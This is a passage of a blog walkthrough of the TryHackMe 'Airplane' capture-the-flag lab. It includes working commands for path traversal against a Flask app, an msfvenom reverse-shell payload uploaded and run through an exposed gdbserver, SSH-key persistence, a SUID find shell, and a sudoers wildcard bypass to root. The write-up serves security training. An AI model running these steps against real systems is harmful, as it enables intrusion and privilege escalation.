</span></span></code></pre></div><figure><img src=/img/airplane/Pasted%20image%2020240729175615.webp></figure><p>We can see that the current user is <code>hudson</code>. We already checked the ssh key in the home directory of hudson.
And now we can confirm that it does not exist.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl --path-as-is <span style=color:#b8bb26>&#39;10.10.121.174:8000/?page=../../../../../../proc/self/cmdline&#39;</span> --silent --output - | sed -e <span style=color:#b8bb26>&#39;s/\x0/\n/g&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/usr/bin/python3
</span></span><span style=display:flex><span>app.py
</span></span></code></pre></div><p>I tried to read the content of the <code>app.py</code> file</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl --path-as-is <span style=color:#b8bb26>&#39;10.10.121.174:8000/?page=../../../../../../proc/self/cwd/app.py&#39;</span> --silent --output - | sed -e <span style=color:#b8bb26>&#39;s/\x0/\n/g&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#fe8019>from</span> flask <span style=color:#fe8019>import</span> Flask, send_file, redirect, render_template, request
</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> os.path
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#fe8019>=</span> Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@app.route(<span style=color:#b8bb26>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#fe8019>if</span> <span style=color:#b8bb26>&#39;page&#39;</span> <span style=color:#fe8019>in</span> request<span style=color:#fe8019>.</span>args:
</span></span><span style=display:flex><span>        page <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#39;static/&#39;</span> <span style=color:#fe8019>+</span> request<span style=color:#fe8019>.</span>args<span style=color:#fe8019>.</span>get(<span style=color:#b8bb26>&#39;page&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fe8019>if</span> os<span style=color:#fe8019>.</span>path<span style=color:#fe8019>.</span>isfile(page):
</span></span><span style=display:flex><span>            resp <span style=color:#fe8019>=</span> send_file(page)
</span></span><span style=display:flex><span>            resp<span style=color:#fe8019>.</span>direct_passthrough <span style=color:#fe8019>=</span> <span style=color:#fe8019>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#fe8019>if</span> os<span style=color:#fe8019>.</span>path<span style=color:#fe8019>.</span>getsize(page) <span style=color:#fe8019>==</span> <span style=color:#d3869b>0</span>:
</span></span><span style=display:flex><span>                resp<span style=color:#fe8019>.</span>headers[<span style=color:#b8bb26>&#34;Content-Length&#34;</span>]<span style=color:#fe8019>=</span><span style=color:#fabd2f>str</span>(<span style=color:#fabd2f>len</span>(resp<span style=color:#fe8019>.</span>get_data()))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#fe8019>return</span> resp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fe8019>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#fe8019>return</span> <span style=color:#b8bb26>&#34;Page not found&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#fe8019>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#fe8019>return</span> redirect(<span style=color:#b8bb26>&#39;http://airplane.thm:8000/?page=index.html&#39;</span>, code<span style=color:#fe8019>=</span><span style=color:#d3869b>302</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@app.route(<span style=color:#b8bb26>&#39;/airplane&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>airplane</span>():
</span></span><span style=display:flex><span>    <span style=color:#fe8019>return</span> render_template(<span style=color:#b8bb26>&#39;airplane.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fe8019>if</span> __name__ <span style=color:#fe8019>==</span> <span style=color:#b8bb26>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#fe8019>.</span>run(host<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;0.0.0.0&#39;</span>, port<span style=color:#fe8019>=</span><span style=color:#d3869b>8000</span>)
</span></span></code></pre></div><p>Nothing interesting in there either.
Then I tried to look into the <code>/proc/sched_debug</code> to get information about the running processes.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl --path-as-is <span style=color:#b8bb26>&#39;10.10.121.174:8000/?page=../../../../../../proc/sched_debug&#39;</span> --silent --output - | sed -e <span style=color:#b8bb26>&#39;s/\x0/\n/g&#39;</span>
</span></span></code></pre></div><p>It generates a long output of all the running processes. After skimming through it I found some python processes:</p><figure><img src=/img/airplane/Pasted%20image%2020240729181205.webp></figure><p>We can check what the command is by using the pid of the process:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl --path-as-is <span style=color:#b8bb26>&#39;10.10.121.174:8000/?page=../../../../../../proc/$PID/cmdline&#39;</span> --silent --output - | sed -e <span style=color:#b8bb26>&#39;s/\x0/\n/g&#39;</span>
</span></span></code></pre></div><p>Nothing important there, its our flask app</p><p>I also saw a <code>gdbserver</code> instance in there.</p><figure><img src=/img/airplane/Pasted%20image%2020240729181459.webp></figure><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl --path-as-is <span style=color:#b8bb26>&#39;10.10.121.174:8000/?page=../../../../../../proc/527/cmdline&#39;</span> --silent --output - | sed -e <span style=color:#b8bb26>&#39;s/\x0/\n/g&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/usr/bin/gdbserver
</span></span><span style=display:flex><span>0.0.0.0:6048
</span></span><span style=display:flex><span>airplane
</span></span></code></pre></div><p>The <code>gdbserver</code> is running on port 6048. I tried some searching and found out that if remote debugging is enabled in gdb, we can upload a reverse shell and execute it.
<a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver>https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver</a></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#928374;font-style:italic>## Generate the payload using msfvenom</span>
</span></span><span style=display:flex><span>msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style=color:#fe8019>=</span>tun0 LPORT<span style=color:#fe8019>=</span><span style=color:#d3869b>1234</span> PrependFork<span style=color:#fe8019>=</span><span style=color:#fabd2f>true</span> -f elf -o binary.elf
</span></span><span style=display:flex><span>chmod +x ./binary.elf
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## open gdb</span>
</span></span><span style=display:flex><span>gdb ./binary.elf
</span></span><span style=display:flex><span>target extended-remote 10.10.121.174:6048
</span></span><span style=display:flex><span>remote put binary.elf /dev/shm/binary.elf
</span></span><span style=display:flex><span><span style=color:#fabd2f>set</span> remote exec-file /dev/shm/binary.elf
</span></span><span style=display:flex><span>run
</span></span></code></pre></div><blockquote><p>NOTE: If you are using <code>peda</code>, <code>gef</code> or any other gdb enhancement tools, start gdb using the -nx flag
otherwise it cause some error when using remote debugging: <code>gdb -nx ./binary.elf</code></p></blockquote><figure><img src=/img/airplane/Pasted%20image%2020240729183159.webp></figure><p>Got shell.</p><blockquote><p>Check out <a href=https://github.com/hanslub42/rlwrap>rlwrap</a>
It can be used with commands like <code>nc</code> to be able to use the arrow keys for editing and accessing the command history etc. in a limited shell environment.</p></blockquote><p>I added an ssh key to hudson&rsquo;s home directory anyway&mldr;</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ssh-keygen -t ed25519 -N <span style=color:#b8bb26>&#39;&#39;</span> -f ./ctf
</span></span></code></pre></div><p>This command will generate 2 files - <code>ctf</code> and <code>ctf.pub</code>.
<code>ctf</code> is the private key that we use to log in and <code>ctf.pub</code> contains the public key that we copy to the machine.
Copy the content of the <code>ctf.pub</code> file to <code>/home/hudson/.ssh/authoried_keys</code></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#fabd2f>echo</span> <span style=color:#b8bb26>&#39;ssh-...&#39;</span> &gt; /home/hudson/.ssh/authorized_keys
</span></span></code></pre></div><p>Now we can login as hudson through ssh</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>chmod <span style=color:#d3869b>600</span> ctf
</span></span><span style=display:flex><span>ssh hudson@airplane.thm -i ctf
</span></span></code></pre></div><hr><h2 id=lateral-movement-to-carlos><a href=#lateral-movement-to-carlos class=anchor-head aria-label=Anchor></a>Lateral Movement to carlos</h2><h3 id=local-enumeration><a href=#local-enumeration class=anchor-head aria-label=Anchor></a>Local Enumeration</h3><p>Finding SUID binaries</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>find / -type f -perm -u<span style=color:#fe8019>=</span>s -exec ls -alp <span style=color:#fe8019>{}</span> <span style=color:#b8bb26>\;</span> 2&gt;/dev/null
</span></span></code></pre></div><blockquote><p>SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.
To learn more about Privilege Escalation using SUID binaries checkout <a href=https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/>this article</a></p></blockquote><figure><img src=/img/airplane/Pasted%20image%2020240729184219.webp></figure><h3 id=lateral-movement><a href=#lateral-movement class=anchor-head aria-label=Anchor></a>Lateral Movement</h3><p>We can use the <code>-exec</code> argument in the <code>find</code> command to execute commands as user carlos.
So to gain shell access as carlos we just need to run:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>find -exec bash -ip <span style=color:#b8bb26>\;</span>
</span></span></code></pre></div><figure><img src=/img/airplane/Pasted%20image%2020240729184608.webp></figure><p>I put the ssh key into carlos as well. SSH is better.</p><hr><h2 id=privilege-escalation><a href=#privilege-escalation class=anchor-head aria-label=Anchor></a>Privilege Escalation</h2><figure><img src=/img/airplane/Pasted%20image%2020240729190926.webp></figure><p>It means that we can run ruby scripts using <code>/usr/bin/ruby</code> with sudo without using password. But it also ensures that we can only run
scripts located inside the <code>/root/</code> directory. And to check whether the givin script is present in the <code>/root</code> directory they uses <code>*</code> character.
We can bypass this check easily because we can replace the <code>*</code> with any character we want, and we can exploit it similiarly to a path traversal attack.
For that we create a ruby script in <code>/tmp</code> or any other directory and when running it we use relative path to that of the <code>/root</code> directory.
For example <code>/tmp/shell.rb</code> becomes <code>/root/../tmp/shell.rb</code>. Note that this matches the <code>/root/*.rb</code> check in the sudoers file.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#fabd2f>echo</span> <span style=color:#b8bb26>&#39;system(&#34;/bin/bash -ip&#34;);&#39;</span> &gt; /tmp/shell.rb
</span></span><span style=display:flex><span>sudo /usr/bin/ruby /root/../tmp/shell.rb
</span></span></code></pre></div><figure><img src=/img/airplane/Pasted%20image%2020240729191305.webp></figure><p>If you want to learn more about this type of attacks, check out <a href=https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-4-wildcards/>this article</a></p><hr><h4 id=resources><a href=#resources class=anchor-head aria-label=Anchor></a>Resources</h4><ul><li><a href=https://httpie.io/>httpie</a></li><li><a href=https://www.daehee.com/blog/werkzeug-console-pin-exploit>Werkzeug Console PIN Exploit</a></li><li><a href=https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#the-proc-file-system>The <code>proc</code> File System</a></li><li><a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver>Pentesting Remote GdbServer</a></li><li><a href=https://github.com/hanslub42/rlwrap>rlwrap</a></li><li><a href=https://gtfobins.github.io/gtfobins/find/>find - GTFOBins</a></li><li><a href=https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-4-wildcards/>Dangerous Sudoers Entries â€“ PART 4: Wildcards</a></li></ul></div></article></main><aside id=sticky-top><div class=toc-title><p>Airplane | TryHackMe</p><hr id=toc-hr></div><nav id=toc class=toc-container><nav id=TableOfContents><ul><li><a href=#information-gathering>Information Gathering</a></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#port-8000---http-flask-302>Port 8000 - HTTP (Flask 3.0.2)</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#path-traversal>Path traversal</a></li></ul></li><li><a href=#lateral-movement-to-carlos>Lateral Movement to carlos</a><ul><li><a href=#local-enumeration>Local Enumeration</a></li><li><a href=#lateral-movement>Lateral Movement</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li></li></ul></li></ul></nav></nav></aside><small class=post-updated-at>updated at 2024-07-29</small><hr><div class=series-nav><div class="alert alert-note"><div class=alert-heading-box><a href=https://h4r1337.github.io/series/try-hack-me/><p class=alert-heading>Try Hack Me Series</p></a></div></div><nav class=post-nav style=margin-top:1rem;border-top:none><a class="post-nav-item post-nav-prev" href=https://h4r1337.github.io/posts/simple-ctf/><div class=nav-arrow>Previous in series</div><span class=post-title>Simple CTF | TryHackMe</span></a></nav></div><nav class=post-nav><a class="post-nav-item post-nav-prev" href=https://h4r1337.github.io/posts/perfection/><div class=nav-arrow>Previous</div><span class=post-title>Perfection | HackTheBox</span>
</a><a class="post-nav-item post-nav-next" href=https://h4r1337.github.io/posts/board-light/><div class=nav-arrow>Next</div><span class=post-title>BoardLight | HackTheBox</span></a></nav></div><footer class=footer><a class=footer_item href=javascript::void(0)>resume</a>
<a class=footer_item href=/index.xml>rss</a>
<span class=footer_item>&copy; 2026</span>
<small class=footer_copyright><a href=https://github.com/h4r1337/hugo-klise target=_blank rel="noreferrer noopener">hugo-klisÃ©</a>
theme on
<a href=https://gohugo.io target=_blank rel="noreferrer noopener">Hugo</a><br><span>Made by <a href=https://github.com/h4r1337 target=_blank rel="noreferrer noopener">h4r1337</a></span></small></footer><script src=/js/main.js defer></script><script src=/js/toc.js defer></script></body></html>